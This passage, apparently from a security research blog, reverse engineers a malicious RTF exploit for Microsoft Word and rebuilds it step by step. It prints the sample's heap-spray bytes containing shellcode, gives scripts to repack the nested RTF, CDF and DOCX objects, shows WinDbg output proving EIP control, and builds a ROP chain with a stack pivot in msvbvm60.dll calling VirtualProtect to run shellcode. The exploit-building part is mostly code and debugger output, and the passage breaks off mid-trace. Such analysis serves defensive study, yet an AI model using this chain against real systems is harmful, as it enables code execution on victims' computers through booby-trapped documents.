 &lt;Relationship Id="rId15" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX11.xml"/>
 &lt;Relationship Id="rId23" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX19.xml"/>
 &lt;Relationship Id="rId28" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX24.xml"/>
 &lt;Relationship Id="rId36" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX32.xml"/>
 &lt;Relationship Id="rId10" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX6.xml"/>
 &lt;Relationship Id="rId19" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX15.xml"/>
 &lt;Relationship Id="rId31" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX27.xml"/>
 &lt;Relationship Id="rId44" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX40.xml"/>
 &lt;Relationship Id="rId4" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.wmf"/>
 &lt;Relationship Id="rId9" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX5.xml"/>
 &lt;Relationship Id="rId14" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX10.xml"/>
 &lt;Relationship Id="rId22" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX18.xml"/>
 &lt;Relationship Id="rId27" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX23.xml"/>
 &lt;Relationship Id="rId30" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX26.xml"/>
 &lt;Relationship Id="rId35" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX31.xml"/>
 &lt;Relationship Id="rId43" Type="https://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX39.xml"/>
&lt;/Relationships>

```

We can see that most of them reference some activeX control. Those documents are all the same and contain:

```
¬†&lt;ax:ocx xmlns:ax="https://schemas.microsoft.com/office/2006/activeX" xmlns:r="https://schemas.openxmlformats.org/officeDocument/2006/relationships" ax:classid="{00000000-0000-0000-0000-000000000001}" ax:persistence="persistStorage" r:id="rId1"/>
```

We can find those relationships in word/activeX/\_rels. Once again, all the files are identical and contain:

```
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?>
&lt;Relationships xmlns="https://schemas.openxmlformats.org/package/2006/relationships">
 &lt;Relationship Id="rId1" Type="https://schemas.microsoft.com/office/2006/relationships/activeXControlBinary" Target="activeX1.bin"/>
&lt;/Relationships>

```

And therefore the embeded object is located at word/activeX/activeX1.bin.

```
$ file word/activeX/activeX1.bin
word/activeX/activeX1.bin: Composite Document File V2 Document, Cannot read section info
```

It is again a CDF file. Its contents will be loaded multiple times, effectively creating a heap spray. This is what will allow us to have controlled data at predictable addresses.

The payload starts at offset 0x800, just after the CDF headers. We can see that the byte sequence cb40 9472 ec83 8808 is repeated until offset 0x00000f30, where we see cb40 9472 d010 9472 followed by some ‚Äúrandom‚Äù bytes. After that, 2b0e 9872 is repeated until offset 0x00001800. This whole sequence is repeated until the end of the file.

```
0x000007f0  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x00000800  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000810  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000820  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000830  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
[...]
0x00000f20  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00000f30  cb40 9472 d010 9472 8f08 9572 b0dd 9572  .@.r...r...r...r
0x00000f40  908c 8808 0102 0000 4000 0000 45c0 a472  ........@...E..r
0x00000f50  892d 8888 8808 9b9b 33c9 648b 7130 8b76  .-......3.d.q0.v
0x00000f60  0c8b 761c 8b46 088b 7e20 8b36 813f 6b00  ..v..F..~ .6.?k.
0x00000f70  6500 75f0 8bf0 eb57 608b de56 8b73 3c8b  e.u....W`..V.s<.
0x00000f80  741e 7803 f356 8b76 2003 f333 c949 41ad  t.x..V.v ..3.IA.
0x00000f90  03c3 5633 f60f be10 3af2 7408 c1ce 0703  ..V3....:.t.....
0x00000fa0  f240 ebf1 3975 005e 75e4 5a8b fb8b 5a24  .@..9u.^u.Z...Z$
[...]
0x000010a0  8bc7 b900 0000 008b 1681 f233 33ad bc89  ...........33...
0x000010b0  1783 c101 81f9 5001 0000 7408 83c6 0483  ......P...t.....
0x000010c0  c704 ebe3 ffe0 cccc 2b0e 9872 2b0e 9872  ........+..r+..r
0x000010d0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000010e0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000010f0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
[...]
0x000017d0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000017e0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x000017f0  2b0e 9872 2b0e 9872 2b0e 9872 2b0e 9872  +..r+..r+..r+..r
0x00001800  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00001810  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
0x00001820  cb40 9472 ec83 8808 cb40 9472 ec83 8808  .@.r.....@.r....
```

Lets see how good is this spray. We attach WinDbg to Word after opening the malicious RTF and let it crash again. Then we look for some tag in the sprayed data, such as cb409472d0109472.

```
0:000> .logopen C:usersuserdesktoph1.txt
Opened log file 'C:usersuserdesktoph1.txt'
0:000> s 0 L?+80000000 cb 40 94 72 d0 10 94 72
[...]
0:000> .logclose
Closing open log file C:usersuserdesktoph1.txt
```

In the log file we can observe that the tag was first found in 0x02e80f50, and last found in 0x12eaff50. As we have chosen a tag which is not at the precise beginning of the sprayed data, we have to subtract its offset to obtain the real addresses in which we will find our payload:

```
0x00000f30  cb40 9472 d010 9472
```

0xf30 ‚Äì 0x800 = 0x730

0x02e80f50 ‚Äì 0x730 = 0x2E80820

```
0:000> dd 0x2E80820
02e80820  729440cb 088883ec 729440cb 088883ec
02e80830  729440cb 088883ec 729440cb 088883ec
02e80840  729440cb 088883ec 729440cb 088883ec
02e80850  729440cb 088883ec 729440cb 088883ec
02e80860  729440cb 088883ec 729440cb 088883ec
02e80870  729440cb 088883ec 729440cb 088883ec
02e80880  729440cb 088883ec 729440cb 088883ec
02e80890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000
02e81820  729440cb 088883ec 729440cb 088883ec
02e81830  729440cb 088883ec 729440cb 088883ec
02e81840  729440cb 088883ec 729440cb 088883ec
02e81850  729440cb 088883ec 729440cb 088883ec
02e81860  729440cb 088883ec 729440cb 088883ec
02e81870  729440cb 088883ec 729440cb 088883ec
02e81880  729440cb 088883ec 729440cb 088883ec
02e81890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000+0x1000
02e82820  729440cb 088883ec 729440cb 088883ec
02e82830  729440cb 088883ec 729440cb 088883ec
02e82840  729440cb 088883ec 729440cb 088883ec
02e82850  729440cb 088883ec 729440cb 088883ec
02e82860  729440cb 088883ec 729440cb 088883ec
02e82870  729440cb 088883ec 729440cb 088883ec
02e82880  729440cb 088883ec 729440cb 088883ec
02e82890  729440cb 088883ec 729440cb 088883ec

0:000> dd 0x2E80820+0x1000+0x1000-4
02e8281c  72980e2b 729440cb 088883ec 729440cb
02e8282c  088883ec 729440cb 088883ec 729440cb
02e8283c  088883ec 729440cb 088883ec 729440cb
02e8284c  088883ec 729440cb 088883ec 729440cb
02e8285c  088883ec 729440cb 088883ec 729440cb
02e8286c  088883ec 729440cb 088883ec 729440cb
02e8287c  088883ec 729440cb 088883ec 729440cb
02e8288c  088883ec 729440cb 088883ec 729440cb
```

The contents of activex1.bin can be found once each 0x1000 bytes from the first location where our payload is loaded.

Now we have everything we need to control EIP. We only need to be able to modify some files and build a RTF.

## 0x04 ‚Äì Creating the matryoska

We have to manage the following structure in order to modify the relevant files:

```
RTF
    CDF/OLE                                Objeto embebido en RTF
        DOCX/ZIP                           Archivo dentro del contenedor CDF
            XML -> document.xml            Archivo que queremos modificar
    CDF/OLE                                Objeto embebido en RTF
        DOCX/ZIP                           Archivo dentro del contenedor CDF
            CDF/OLE -> activex1.bin        Archivo que queremos modificar
```

This is the plan:

* 1. Modify the contents of activex1.bin, changing the payload
* 2. Modify document.xml, changing the target address
* 3. Create two new ZIPs/DOCX with the previously changed files
* 4. Create two new CDF files containing the previously created ZIPs/DOCX
* 5. Replace the two relevant objects in the original RTF with the two we have just created

### Modifying activex1.bin

To do a quick test we will overwrite the first dword of each repeated chunk (offset 0x800 + N \* 0x1000) with 0x41424344

```
$ cat tag_bin.py
import sys

if __name__ == '__main__':
        in_filepath = sys.argv[1]
        out_filepath = sys.argv[2]

        f = open(in_filepath, "rb")
        original = bytearray(f.read())
        f.close()

        begin = 0x800
        offset = 0x1000

        p = begin
        while p < len(original) - 4:
                original[p] = 0x44
                original[p+1] = 0x43
                original[p+2] = 0x42
                original[p+3] = 0x41

                p += offset

        f = open(out_filepath, "wb")
        f.write(original)
        f.close()

$ python tag_bin.py 00039807.doc/word/activeX/activeX1.bin test.bin
$ mv test.bin 00039807.doc/word/activeX/activeX1.bin
```
### Modifying document.xml

We want to replace the address used by the authors of the sample with an address which is valid in our environment:

```
$ cat replace_offset.py
import struct
import sys

def dword_to_crap(v):
    # unicode -> utf8
    return struct.pack("<I", v).decode("utf-16le").encode("utf-8").encode("hex") def crap_to_dword(v): # utf8 -> unicode
    return unicode(v.decode("utf-8")).encode("utf-16le")

if __name__ == '__main__':
    whatb = sys.argv[1]
    withb = sys.argv[2]
    fpath = sys.argv[3]
    fdest = sys.argv[4]

    withv = dword_to_crap(int(withb, 16))

    #print ' -> %s' % crap_to_dword(whatb.decode("hex")).encode("hex")
    print 'Replacing raw utf8 "%s" with %s -> %s' % (whatb, withb, withv)

    f = open(fpath, "rb")
    b = f.read()
    f.close()

    c = b.replace(whatb.decode("hex"), withv.decode("hex"))

    f = open(fdest, "wb")
    f.write(c)
    f.close()

$ python2 replace_offset.py e8a3ace0a288 0x0f8f4820 000538E9.doc/word/document.xml document.xml
Replacing raw utf8 "e8a3ace0a288" with 0x0f8f4820 -> e4a0a0e0be8f
$ mv document.xml 000538E9.doc/word/document.xml
```
### Creating the ZIPs/DOCX

```
$ cd 00039807.doc
$ zip -D -q -9 -r spray.doc .
$ cd ../000538E9.doc
$ zip -D -q -9 -r trigger.doc .
```
### Creating the CDFs

We need a library which allows us to modify the contents of this kind of file. We have Python‚Äôs olefile, but writing is not fully implemented.

Finally, we decded tu use openmcdf, a C# library. Then we only have to write a simple utility:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using OpenMcdf;

namespace cdfreplace
{
    class Program
    {
        static void Main(string[] args)
        {
            string sourcefile = args[0];
            string targetstream = args[1];
            string replfile = args[2];
            string outfile = args[3];

            byte[] replbytes = System.IO.File.ReadAllBytes(replfile);

            System.IO.File.Copy(sourcefile, outfile);

            OpenMcdf.CompoundFile cf = new OpenMcdf.CompoundFile(
                outfile,
                OpenMcdf.CFSUpdateMode.Update,
                OpenMcdf.CFSConfiguration.Default | OpenMcdf.CFSConfiguration.EraseFreeSectors | OpenMcdf.CFSConfiguration.SectorRecycle
               );
            OpenMcdf.CFStream st = cf.RootStorage.GetStream(targetstream);
            st.SetData(replbytes);
            cf.Commit();
        }
    }
}
```

We rename the original CDF files we extracted at the beginning:

‚Äì cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_00039807.doc -> original\_spray.cdf

‚Äì cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5\_object\_000538E9.doc -> original\_trigger.cdf

After installing OpenMcdf, we compile our utility. We execute these commands:

```
$ mono cdfreplace.exe original_spray.cdf Package 00039807.doc/spray.doc spray.cdf
$ mono cdfreplace.exe original_trigger.cdf Package 000538E9.doc/trigger.doc trigger.doc
```

Now we are ready to modify the original RTF file.

### Modifying the RTF file

We use our simple tool to replace objects 1 and 2 with the objects we generated in the previous step.

```
$ python2 rtf.py --input original.rtf --output tmp.rtf --replace 1 --withfile spray.cdf
$ python2 rtf.py --input tmp.rtf --output final.rtf --replace 2 --withfile trigger.cdf
```
### PoK (Proof of Kaboom)

After copying test.rtf to our isolated VM, we launch a new WinDbg session:

```
(de8.944): Unknown exception - code e0000002 (first chance)
(de8.944): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=0f8f4820 ebx=00000000 ecx=41424344 edx=00000004 esi=0a8b3f20 edi=0aa27604
eip=702882a6 esp=003349b8 ebp=00334a28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
wwlib!DllGetLCID+0x2e1e1c:
702882a6 ff5104          call    dword ptr [ecx+4]    ds:002b:41424348=????????

0:000> ub;u
wwlib!DllGetLCID+0x2e1e05:
7028828f 85c9            test    ecx,ecx
70288291 0f84c768e9ff    je      wwlib!DllGetLCID+0x1786d4 (7011eb5e)
70288297 8b4744          mov     eax,dword ptr [edi+44h]
7028829a 894844          mov     dword ptr [eax+44h],ecx
7028829d 8b4744          mov     eax,dword ptr [edi+44h]
702882a0 8b4044          mov     eax,dword ptr [eax+44h]
702882a3 8b08            mov     ecx,dword ptr [eax]
702882a5 50              push    eax
wwlib!DllGetLCID+0x2e1e1c:
702882a6 ff5104          call    dword ptr [ecx+4]
702882a9 e9b068e9ff      jmp     wwlib!DllGetLCID+0x1786d4 (7011eb5e)
702882ae 83f802          cmp     eax,2
702882b1 750f            jne     wwlib!DllGetLCID+0x2e1e38 (702882c2)
702882b3 8d4624          lea     eax,[esi+24h]
702882b6 50              push    eax
702882b7 52              push    edx
702882b8 e893171c00      call    wwlib!DllGetLCID+0x4a35c6 (70449a50)
```

EAX = 0x0f8f4820 and ECX = 0x41424344. It has crashed in a call instruction, which will redirect the execution flow to whatever address we put in the address 0x0f8f4820+4. The only thing left is creating a useful payload.

## 0x05 ‚Äì Creating our payload

Lets remember the layout we need in order to control EIP:

```
Address      Value
X            X
X + 4        Target EIP
```

So, if we use 0x0f8f4820, we have to put at the beginning of the payload the following:

```
[
    0x0f8f4820,
    EIP
]
```

To achieve:

```
Address      Value
0x0f8f4820   0x0f8f4820
0x0f8f4824   Target EIP
```

How can we turn this into controlled code execution? We have a call to a controlled address. DEP is enabled, so we cannot simply jump to an address in the heap we control.

We have to use ROP, so we need ESP to point to an address in which we can put the address of our gadgets. This is, once again, the heap we are spraying, so we must perform a stack pivot.

Our goal, then, is to set EIP to a sequence of instructions which will make ESP point to somewhere in the heap we can control, possibly just after the two addresses we have used up to this point.

As we saw at the beginning of this post, the only module which is not ASLR enabled is msvbvm60.dll. Lets get the available gadgets:

```
$ sha256sum libs/msvbvm60.dll
2246b4feae199408ea66d4a90c1589026f4a5800ce5a28e583b94506a8a73dce  libs/msvbvm60.dll
$ ROPgadget --binary libs/msvbvm60.dll > gadgets.txt
```

Our environment is the following:

* EAX = payload‚Äôs address
* ECX = payload‚Äôs address
* Top of the stack: payload‚Äôs address (once the call instruction is executed, it will be the return address)

We want:

* ESP = payload‚Äôs address + some delta to bypass the first two addresses and leaves us enough space to work comfortably
* To keep a copy of the original ESP just in case we want to restore Word to a sane execution and thus not crash.

Lets see which gadgets allow us to control ESP. We want to avoid those which perform calls or jumps (they may be useful, but after a quick glance there didn‚Äôt seem to be any which would allow us to keep going in a simple way).

```
$ cat gadgets.txt| grep -v call | grep -v jmp | grep -v jb | grep esp | grep xchg
[...]
0x7297d562 : je 0x7297d590 ; adc al, ch ; pop ecx ; xchg eax, esp ; add al, byte ptr [eax] ; ret 8
[...]
```

There are several gadgets matching our conditions, but we chose that one. It starts with a jump, but we can skip it anyway:

```
$ r2 libs/msvbvm60.dll
[0x72941af8]> s 0x7297d562
[0x7297d562]> pd
        ,=< 0x7297d562      7424           je 0x7297d588
        |   0x7297d564      10e8           adc al, ch
        |   0x7297d566      59             pop ecx
        |   0x7297d567      94             xchg eax, esp
        |   0x7297d568      0200           add al, byte [eax]
        |   0x7297d56a      c20800         ret 8
```

This is what will happen when EIP reaches 0x7297d564:

* EAX = 0x0f8f4820
* ECX = 0x0f8f4820
* EAX = EAX + ECX‚Äôs 2nd less weighted byte => EAX = EAX + 0x48 => EAX = 0x0f8f4868
* ECX = return address pushed by the call instruction
* ESP = payload‚Äôs address + 0x48 => ESP = 0x0f8f4868
* EAX = old stack address
* EAX = old stack address + [0-0xff]
* ESP = address of the first gadget in our ROP chain
* EIP = address written in the offset 0x48 of our payload (0x0f8f4868 ‚Äì 0x0f8f4820)

We have to take care of the ‚Äúret 8‚Äù in the end of the stack pivot, so we will insert 8 bytes of padding between the first and second gadgets.

From now on we are able to execute ROP gadgets. Lets do a quick check, forcing Word to jump to the classic 0x41414141:

```
import struct
import sys

p = lambda x: struct.pack("<L", x) heap = 0x0f8f4820 pivot = 0x7297d564 padsize = (heap >> 8) & 0xFF

rop = [
  p(heap),
  p(pivot),

  "a" * (padsize - 8),

  p(0x41414141)
]

payload = bytearray("".join(rop))
payload_size = len(payload)

if __name__ == '__main__':
  in_filepath = sys.argv[1]
  out_filepath = sys.argv[2]

  f = open(in_filepath, "rb")
  original = bytearray(f.read())
  f.close()

  begin = 0x800
  offset = 0x1000

  p = begin
  while p < len(original) - payload_size:
    for x in range(payload_size):
      original[p + x] = payload[x]

    p += offset

  f = open(out_filepath, "wb")
  f.write(original)
  f.close()
```

In WinDbg, we set a breakpoint in our stack pivot:

```
(2dc.158): Break instruction exception - code 80000003 (first chance)
eax=7ef88000 ebx=00000000 ecx=00000000 edx=77b3f142 esi=00000000 edi=00000000
eip=77ab000c esp=0da1f8d4 ebp=0da1f900 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!DbgBreakPoint:
77ab000c cc              int     3

0:016> bu 0x7297d564

0:016> g
(2dc.a70): Unknown exception - code e0000002 (first chance)
Breakpoint 0 hit
eax=0f8f4820 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d564 esp=00494cb4 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef24:
7297d564 10e8            adc     al,ch

0:000> p
eax=0f8f4868 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d566 esp=00494cb4 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef26:
7297d566 59              pop     ecx

0:000> p
eax=0f8f4868 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d567 esp=00494cb8 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef27:
7297d567 94              xchg    eax,esp

0:000> p
eax=00494cb8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d568 esp=0f8f4868 ebp=00494d28 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef28:
7297d568 0200            add     al,byte ptr [eax]          ds:002b:00494cb8=20

0:000> p
eax=00494cd8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=7297d56a esp=0f8f4868 ebp=00494d28 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200286
msvbvm60!IID_IVbaHost+0xef2a:
7297d56a c20800          ret     8

0:000> p
eax=00494cd8 ebx=00000000 ecx=6ec182a9 edx=00000004 esi=0a769fc0 edi=0a8fdac4
eip=41414141 esp=0f8f4874 ebp=00494d28 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200286
41414141 ??              ???
```

Success.

The next step is executing a shellcode. To do so, we have to put it in a controlled memory address (the same heap page we are working in) and call

```
VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &old_protect);
```

Where:

* address: address of the shellcode
* size: size of the memory zone we want to make executable
* PAGE\_EXECUTE\_READWRITE: we want to assign read+write+execute permissions, which is 0x40 in WinApi language. We‚Äôd like to use PAGE\_EXECUTE\_READ instead, but note that we are using the same memory address both for code and stack, so it must remain writable.
* old\_protect: where to save the old memory protection flags

We need the address of VirtualProtect. We might get it from the PEB, but msvbvm60 makes it easier for us. Lets check its imports:

```
$ r2 ibs/msvbvm60.dll
[0x72941af8]> ii~VirtualProtect
ordinal=053 plt=0x729410d0 bind=NONE type=FUNC name=KERNEL32.dll_VirtualProtect

0:000> dd 0x729410d0
729410d0  759042ff 75904333 7591e8c5 75925935
0:000> u 759042ff
kernel32!VirtualProtectStub:
759042ff 8bff            mov     edi,edi
75904301 55              push    ebp
75904302 8bec            mov     ebp,esp
75904304 5d              pop     ebp
75904305 e9becdffff      jmp     kernel32!VirtualProtect (759010c8)
```

We have a pointer to VirtualProtect stored at msvbvm60‚Äôs 0x729410d0. If we jump here we only have to make sure that we have set up the stack in a way that resembles a proper call:

```
Top of the stack
----
old_protect                   ; push arg_4
PAGE_EXECUTE_READWRITE        ; push arg_3
size                          ; push arg_2
address                       ; push arg_1
siguiente gadget              ; call VirtualProtect
----
Bottom of the stack
```

How do we jump to VirtualProtect? We can look for gadgets containing jumps to registers that we can control:

* Direct to register, such as jmp eax
* Indirect to register, such as jmp [eax]

The second option saves us from having to ROP the dereference, so:

```
$ cat gadgets.txt| grep "jmp dword ptr ["
[...]
0x7295088f : jmp dword ptr [eax]
0x72a3eb27 : jmp dword ptr [ebp - 0x6c]
0x729907a2 : jmp dword ptr [ebx]
0x72a429d8 : jmp dword ptr [ecx - 1]
0x72949a32 : jmp dword ptr [ecx]
0x729eb1db : jmp dword ptr [edi]
0x729eb1e0 : jmp dword ptr [edx]
0x72a21a18 : jmp dword ptr [esi - 0x75]
0x72a00884 : jmp dword ptr [esi - 0x7d]
0x7295cb96 : jmp dword ptr [esi]
0x729eb1ef : jmp dword ptr [esp + esi*2]
[...]
0x729914fb : sti ; jmp dword ptr [ecx]
[...]
```

We have plenty of choice here. What registers are we able to control?

```
$ cat gadgets.txt| egrep ": pop (e[abcd]x|e[sd]i) ; ret"
0x729440cb : pop eax ; ret
0x72992f5e : pop eax ; ret 0x10
0x72a06933 : pop eax ; ret 0x14
0x729c0a9b : pop eax ; ret 0xc
0x72944175 : pop eax ; ret 4
0x7298fa2e : pop eax ; ret 8
0x72941f10 : pop ebx ; ret
0x72991c70 : pop ebx ; ret 0x10
0x72999274 : pop ebx ; ret 0x14
0x72941b4e : pop ebx ; ret 0xc
0x72943255 : pop ebx ; ret 4
0x729459e4 : pop ebx ; ret 8
0x729419f4 : pop ecx ; ret
0x729e1dfc : pop ecx ; ret 0x14
0x72954ecc : pop ecx ; ret 0x7297
0x729e19db : pop ecx ; ret 0xc
0x729ff08b : pop ecx ; ret 0xfff5
0x7294a47b : pop ecx ; ret 4
0x7294464b : pop ecx ; ret 8
0x7294575b : pop edi ; ret
0x729d0fc9 : pop edi ; ret 0x10
0x7294e501 : pop edi ; ret 4
0x7298c1e4 : pop edi ; ret 8
0x729a4421 : pop edx ; ret
0x72941e54 : pop esi ; ret
0x7294a52f : pop esi ; ret 0x10
0x72974c79 : pop esi ; ret 0x14
0x729a32b5 : pop esi ; ret 0x1c
0x729d831e : pop esi ; ret 0x24
0x72945a74 : pop esi ; ret 0xc
0x7294356a : pop esi ; ret 4
0x72945940 : pop esi ; ret 8
```

We will use EAX. However, it would be convenient to save it somewhere, as at this point it contains the only copy of the original value of ESP. This, however, is left as an exercise.

We have to choose a static address to use as the 4th argument of VirtualProtect. Let‚Äôs see where the data section is located:

```
[0x7297d562]> iS
[Sections]
idx=00 vaddr=0x72941000 paddr=0x00001000 sz=1032192 vsz=1032192 perm=m-r-x name=.text
idx=01 vaddr=0x72a3d000 paddr=0x000fd000 sz=53248 vsz=53248 perm=m-r-x name=ENGINE
idx=02 vaddr=0x72a4a000 paddr=0x0010a000 sz=28672 vsz=32768 perm=m-rw- name=.data
idx=03 vaddr=0x72a52000 paddr=0x00111000 sz=200704 vsz=200704 perm=m-r-- name=.rsrc
idx=04 vaddr=0x72a83000 paddr=0x00142000 sz=65536 vsz=65536 perm=m-r-- name=.reloc

0:000> dd 0x72a4a000 0x72a4a000+28672
[...]
72a4d290  00000000 00000000 00000000 00000000
72a4d2a0  00000000 00000000 00000000 00000000
72a4d2b0  00000000 00000000 00000000 00000000
72a4d2c0  00000000 00000000 00000000 00000000
72a4d2d0  00000000 00000000 00000000 00000000
72a4d2e0  00000000 00000000 00000000 00000000
72a4d2f0  00000000 00000000 00000000 00000000
72a4d300  00000000 00000000 00000000 00000000
72a4d310  00000000 00000000 00000000 00000000
72a4d320  00000000 00000000 00000000 00000000
72a4d330  00000000 00000000 00000000 00000000
72a4d340  00000000 00000000 00000000 00000000
72a4d350  00000000 00000000 00000000 00000000
72a4d360  00000000 00000000 00000000 00000000
72a4d370  00000000 00000000 00000000 00000000
72a4d380  00000000 00000000 00000000 00000000
72a4d390  00000000 00000000 00000000 00000000
72a4d3a0  00000000 00000000 00000000 00000000
72a4d3b0  00000000 00000000 00000000 00000000
[...]
```

We are looking for some unused space. For example, 0x72a4d300. We will zero out the dword at that address when we are done.

Our ROP chain would be like this:

```
heap = 0x0f8f4820
pivot = 0x7297d564
pop_eax = 0x729440cb
jmp_ptr_eax = 0x7295088f
ptr_virtualprotect = 0x729410d0

virtualprotect_size = 0x200
virtualprotect_prot = 0x40
virtualprotect_oldprot = 0x72a4d300
shellcode_address = heap + (padsize - 8) + 48

shellcode = "xcc"

rop = [
  p(heap),                  # @0
  p(pivot),                 # @4

  "a" * (padsize - 8),      # @8

  p(pop_eax),               # @ 8 + padsize
  "a" * 8,                  # @ 12 + padsize ; compensamos ret 8
  p(ptr_virtualprotect),   # @ 20 + padsize
  p(jmp_ptr_eax),           # @ 24 + padsize

  p(shellcode_address),     # @ 28 + padsize ; retorno de VirtualProtect
  p(shellcode_address),     # @ 32 + padsize ; address
  p(virtualprotect_size),   # @ 36 + padsize ; size
  p(virtualprotect_prot),   # @ 40 + padsize ; new prot
  p(virtualprotect_oldprot),# @ 44 + padsize ; & old prot

  shellcode                 # @ 48 + padsize
]
```

If everything went OK, after creating the RTF file and opening it with Word, WinDbg should catch the ‚Äúint 3‚Äù we put as a shellcode.

```
0:015> bu 0x7297d564
(ecc.3d4): Unknown exception - code e0000002 (first chance)
Breakpoint 0 hit
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program Files (x86)Microsoft OfficeOffice15wwlib.dll -
eax=0f8f4820 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d564 esp=00644bd4 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef24:
7297d564 10e8            adc     al,ch

0:000> p
eax=0f8f4868 ebx=00000000 ecx=0f8f4820 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d566 esp=00644bd4 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef26:
7297d566 59              pop     ecx

0:000>
eax=0f8f4868 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d567 esp=00644bd8 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef27:
7297d567 94              xchg    eax,esp

0:000>
eax=00644bd8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d568 esp=0f8f4868 ebp=00644c48 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
msvbvm60!IID_IVbaHost+0xef28:
7297d568 0200            add     al,byte ptr [eax]          ds:002b:00644bd8=20

0:000>
eax=00644bf8 ebx=00000000 ecx=6f9882a9 edx=00000004 esi=0a45f4d0 edi=0a47cde4
eip=7297d56a esp=0f8f4868 ebp=00644c48 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
